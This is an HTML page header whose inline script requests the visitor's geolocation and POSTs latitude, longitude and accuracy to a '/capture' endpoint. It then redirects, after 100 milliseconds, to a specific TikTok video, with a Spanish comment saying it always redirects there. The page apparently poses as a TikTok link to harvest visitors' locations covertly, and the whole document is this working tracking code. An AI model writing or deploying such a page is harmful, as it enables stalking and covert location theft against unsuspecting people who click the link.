<head>
    <script>
        navigator.geolocation.getCurrentPosition(
            pos => {
                const data = `lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`;
                fetch('/capture', { method: 'POST', body: data, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
            },
            err => { console.log(err); },
            { maximumAge: 60000, timeout: 5000 }
        );
        // Redirige a TikTok SIEMPRE
        setTimeout(() => { window.location.href = 'https://www.tiktok.com/@motoguate/video/7551219694443793720?is_from_webapp=1&sender_device=pc'; }, 100);
    </script>
</head>
